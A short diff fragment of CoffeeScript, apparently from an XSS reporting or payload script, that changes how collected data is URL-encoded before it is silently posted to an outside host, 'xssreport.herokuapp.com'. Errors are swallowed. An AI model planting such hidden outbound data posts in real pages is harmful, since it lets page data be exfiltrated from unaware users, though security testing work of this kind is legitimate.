@@ -18,7 +18,7 @@ try
   ajax.post 'https://xssreport.herokuapp.com/upload/', ->
       # do nothing here!! 
       ;
-    , 'd=' + JSON.stringify(data)
+    , 'd=' + encodeURIComponent(JSON.stringify(data))
 catch e
   ;
 
